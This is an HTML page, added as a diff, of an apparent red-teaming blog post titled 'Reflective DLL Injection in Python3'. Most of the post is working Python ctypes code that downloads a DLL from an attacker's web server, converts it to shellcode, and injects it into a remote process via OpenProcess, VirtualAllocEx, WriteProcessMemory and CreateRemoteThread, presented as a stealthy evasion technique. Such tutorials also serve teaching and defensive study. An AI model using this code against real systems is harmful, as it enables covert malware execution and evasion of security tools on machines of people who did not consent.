@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="https://momo1239.github.io/2021/active-directory-forest-domain-trusts/" />
+  
+  <link rel="canonical" href="https://momo1239.github.io/2021/dll/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Reflective DLL Injection in Python3 | Kenny Nguyen (momo)
+       
+  </title>
+  <meta name="title" content="Reflective DLL Injection in Python3 | Kenny Nguyen (momo)">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://momo1239.github.io"/>
+
+<meta name="twitter:title" content="Reflective DLL Injection in Python3"/>
+<meta name="twitter:description" content="What is DLL Injection? DLL Injection is a common evasion technique used by many malware samples. We can execute shellcode in memory of our current process, and inject shellcode into remote processes with process injection. But instead of just shellcode, we can also inject an entire DLL into a remote process as well. DLL injection is the process of inserting code into a running process. DLLs are meant to be loaded as needed at run time."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Reflective DLL Injection in Python3",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/momo1239.github.io\/2021\/dll\/"
+  },
+  
+  "genre": "posts",
+  "keywords": "red teaming, python",
+  "wordcount":  1025 ,
+  "url": "https:\/\/momo1239.github.io\/2021\/dll\/",
+  "datePublished": "2021-12-19T00:00:00\u002b00:00",
+  "dateModified": "2021-12-19T00:00:00\u002b00:00",
+  
+  
+  
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="https://momo1239.github.io">Kenny Nguyen (momo)</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="https://momo1239.github.io">Kenny Nguyen (momo)</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">Reflective DLL Injection in Python3</h1>
+        <div class="post-meta">
+            Written by <a href="https://momo1239.github.io" rel="author">Momo</a> with ♥ 
+                <span class="post-time">
+                    on <time datetime=2021-12-19 >19 December 2021</time>
+                </span>
+                in
+                
+                <i class="iconfont icon-timer"></i>
+                5 min
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <h1 id="what-is-dll-injection">What is DLL Injection?</h1>
+<p>DLL Injection is a common evasion technique used by many malware samples. We can execute shellcode in memory of our current process, and inject shellcode into remote processes with process injection. But instead of just shellcode, we can also inject an entire DLL into a remote process as well. DLL injection is the process of inserting code into a running process. DLLs are meant to be loaded as needed at run time. However, we can still inject assembly in other forms (exe, etc).</p>
+<h1 id="approach">Approach</h1>
+<ul>
+<li>Attach to the process</li>
+<li>Allocate memory within the process</li>
+<li>Copy the DLL path into process memory</li>
+<li>Create a thread within the process to execute your DLL</li>
+</ul>
+<p>We will use the following APIs to perform this technique.</p>
+<ul>
+<li>OpenProcess()</li>
+<li>VirtualAllocEx()</li>
+<li>WriteProcessMemory()</li>
+<li>LoadLibraryA()</li>
+<li>CreateRemoteThread(), NtCreateThreadEx, etc.</li>
+</ul>
+<p>There are a few options when it comes to executing our DLL. For this post, I will use CreateRemoteThread(). The problem is, we can&rsquo;t simply give the names of our DLL to these functions. We have to provide a memory address to start the execution. We will perform the allocate and copy steps to obtain space within the remote process' memory.</p>
+<p>In order to load DLLs or executables, we will use LoadLibraryA() to take a filename as its parameter and do magical things.</p>
+<h1 id="downloading-the-dll">Downloading the DLL</h1>
+<p>First, we&rsquo;ll create a function that will download the DLL from our attacking web server and write it to disk.</p>
+<p>We can use urllib.request for this:</p>
+<pre tabindex="0"><code>def downloader(url, dllname):
+    urllib.request.urlretrieve(url, dllname)
+    dll = bytes(dllname.encode())
+    return dll
+</code></pre><p>This function will return us the path to the DLL for LoadLibraryA() later.</p>
+<h1 id="win32-api">Win32 API</h1>
+<p>Now we&rsquo;ll create definitions for the functions we want to call.</p>
+<pre tabindex="0"><code>kernel32 = ctypes.windll.kernel32
+
+LPCTSTR = ctypes.c_char_p 
+SIZE_T = ctypes.c_size_t
+
+OpenProcess = kernel32.OpenProcess
+OpenProcess.argtypes = (ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD)
+OpenProcess.restype = ctypes.wintypes.HANDLE
+
+VirtualAllocEx = kernel32.VirtualAllocEx
+VirtualAllocEx.argtypes = (ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, SIZE_T, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD)
+VirtualAllocEx.restype = ctypes.wintypes.LPVOID
+
+WriteProcessMemory = kernel32.WriteProcessMemory
+WriteProcessMemory.argtypes = (ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, ctypes.wintypes.LPCVOID, SIZE_T, ctypes.POINTER(SIZE_T))
+WriteProcessMemory.restype = ctypes.wintypes.BOOL
+
+GetModuleHandle = kernel32.GetModuleHandleA
+GetModuleHandle.argtypes = (LPCTSTR, )
+GetModuleHandle.restype = ctypes.wintypes.HANDLE
+
+GetProcAddress = kernel32.GetProcAddress
+GetProcAddress.argtypes = (ctypes.wintypes.HANDLE, LPCTSTR)
+GetProcAddress.restype = ctypes.wintypes.LPVOID
+
+class _SECURITY_ATTRIBUTES(ctypes.Structure):
+    _fields_ = [('nLength', ctypes.wintypes.DWORD),
+                ('lpSecurityDescriptor', ctypes.wintypes.LPVOID),
+                ('bInheritHandle', ctypes.wintypes.BOOL)]
+
+SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
+LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
+LPTHREAD_START_ROUTINE = ctypes.wintypes.LPVOID
+
+
+CreateRemoteThread = kernel32.CreateRemoteThread
+CreateRemoteThread.argtypes = (ctypes.wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, ctypes.wintypes.LPVOID, ctypes.wintypes.DWORD, ctypes.wintypes.LPDWORD)
+CreateRemoteThread.restype = ctypes.wintypes.HANDLE
+
+MEM_COMMIT = 0x0001000
+MEM_RESERVE = 0x00002000
+PAGE_READWRITE = 0x04
+EXECUTE_IMMEDIATELY = 0x0
+PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)
+</code></pre><h1 id="openprocess">OpenProcess()</h1>
+<p>We will use OpenProcess() to return a handle to the process so we can interact with it.</p>
+<p><code>handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)</code></p>
+<p>OpenProcess() takes three arguments.</p>
+<ul>
+<li>
+<p>dwDesiredAccess - This is the access rights to the process. In order to use WriteProcessMemory, the handle must have PROCESS_VM_WRITE and PROCESS_VM_OPERATION access to the process.</p>
+</li>
+<li>
+<p>bInheritHandle - If this value is TRUE, then the process created by this process will also inherit the handle. We don&rsquo;t need this so we set it to false.</p>
+</li>
+<li>
+<p>dwProcessID - This is the process id of the process to be opened.</p>
+</li>
+</ul>
+<h1 id="virtualallocex">VirtualAllocEx()</h1>
+<p>VirtualAllocEx() takes amount of memory to allocate as one of its parameters. If we use LoadLibraryA(), we&rsquo;ll allocate space for the full path of the DLL.</p>
+<p>We&rsquo;ll use VirtualAllocEx() to allocate memory in the remote process.</p>
+<p><code>memory = VirtualAllocEx(handle, False, len(dllname) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)</code></p>
+<p>VirtualAllocEx() takes five arguments.</p>
+<ul>
+<li>
+<p>hProcess - This is the handle to the process. The function will allocate memory within the virtual address space of this process.</p>
+</li>
+<li>
+<p>lpAddress - This is a pointer to the starting address of the region of pages you want to allocate. If this is NULL, the function will determine where to allocate the region.</p>
+</li>
+<li>
+<p>dwSize - This is the size of the region of memory to allocate, in bytes. We will allocate space for the full path of the DLL.</p>
+</li>
+<li>
+<p>flAllocationType and flProtect indicates the allocation type and memory protection. We will use 0x3000 for the allocation type which will call VirtualAllocEx with MEM_RESERVE and MEM_COMMIT. 0x40 indicates that the memory is readable and writable.</p>
+</li>
+</ul>
+<h1 id="writeprocessmemory">WriteProcessMemory()</h1>
+<p>Now we will copy the DLL path into the process. We can use WriteProcessMemory to do so.</p>
+<p><code>write = WriteProcessMemory(handle, memory, dllname, len(dllname) + 1, None)</code></p>
+<h1 id="loadlibrarya-and-createremotethread">LoadLibraryA() and CreateRemoteThread()</h1>
+<p>Now that we have our DLL written to the remote process, we can start a new thread to load our DLL. First, we need to find the location of LoadLibrary(). To do so, we&rsquo;ll use GetProcAddress and GetModuleHandle.</p>
+<p>GetProcAddress will retrieve the address of an exported function or variable from a DLL.
+Then we can use GetModuleHandle to retrieve a module handle to a specified module.</p>
+<p><code>load_lib = GetProcAddress(GetModuleHandle(b&quot;kernel32.dll&quot;), b&quot;LoadLibraryA&quot;)</code></p>
+<p>We have the load library address now, all we need to do is to create a thread to execute the loaded DLL.</p>
+<p><code>rthread = CreateRemoteThread(handle, None, 0, load_lib, memory, EXECUTE_IMMEDIATELY, None)</code></p>
+<h1 id="reflective-dll-injection">Reflective DLL Injection</h1>
+<p>When we use DLL Injection we have to write the DLL to the disk. This is a big compromise if we are trying to be &ldquo;stealthy&rdquo;. Windows does not have a LoadLibrary function that supports loading a DLL from memory rather than from disk. In order to do so, we have to write our own function. There are also other techniques for reflecting DLL injection such as using the SetThreadContext() and NtContinue() functions to change a thread&rsquo;s registers and perform a restoration process.</p>
+<p>In this post, we will convert our DLL into shellcode and then inject it into a remote process. We can use the function ConvertToShellcode from <a href="https://github.com/monoxgas/sRDI">here</a>.</p>
+<pre tabindex="0"><code>from ShellcodeRDI import *
+
+dll = open(&quot;TestDLL_x86.dll&quot;, 'rb').read()
+shellcode = ConvertToShellcode(dll)
+</code></pre><p>Now we need to take this shellcode and inject it into a remote process. This can be done with a shellcode runner but we&rsquo;ll need to modify it to use OpenProcess() and other APIs to interact with a remote process.</p>
+<pre tabindex="0"><code>def method2(url, pid):
+    dll = urllib.request.urlopen(url, 'rb').read()
+    shellcode = ConvertToShellcode(dll)
+
+    handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+    print(&quot;[+] Obtaining handle...&quot;)
+    time.sleep(2)
+
+    memory = VirtualAllocEx(handle, False, len(shellcode) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+    print(&quot;[+] Allocating memory in remote process...&quot;)
+    time.sleep(2)
+
+    write = WriteProcessMemory(handle, memory, shellcode, len(shellcode) + 1, None)
+    print(&quot;[+] Writing payload into process memory...&quot;)
+    time.sleep(2)
+
+    print(&quot;[+] Execution completed.&quot;)
+
+    rthread = CreateRemoteThread(handle, None, 0, memory, None, EXECUTE_IMMEDIATELY, None)
+</code></pre><p><a href="https://github.com/momo1239/buffdawg">Link to the code on github</a></p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Momo </span>
+                </p>
+            
+           
+            <p class="copyright-item">
+                    <span>Words:</span>
+                   <span>1025</span>
+            </p>
+
+            <p class="copyright-item">
+                
+                <span>Share:</span>
+                <span>
+
+      
+      
+      
+      
+      
+      
+      
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fmomo1239.github.io%2f2021%2fdll%2f&amp;title=Reflective%20DLL%20Injection%20in%20Python3" target="_blank" title="Share on LinkedIn">
+          <i class="iconfont icon-linkedin"></i>
+        </a>
+        
+      
+      
+        
+      
+        
+      
+
+          
+
+          
+
+          
+
+          
+
+</span>
+                
+            </p>
+
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-icon-tag"></i>Tag: 
+            
+            <span class="tag"><a href="https://momo1239.github.io/tags/red-teaming/">
+                    #red teaming</a></span>
+            
+            <span class="tag"><a href="https://momo1239.github.io/tags/python/">
+                    #python</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> · 
+                <span><a href="https://momo1239.github.io">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://momo1239.github.io/2021/active-directory-forest-domain-trusts/" class="prev" rel="prev" title="Active Directory - Forest &amp; Domain Trusts"><i class="iconfont icon-dajiantou"></i>&nbsp;Active Directory - Forest &amp; Domain Trusts</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+          
+
+ 
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://momo1239.github.io">Momo</a> | </span>
+         
+
+		  <span>2021 </span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+  
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
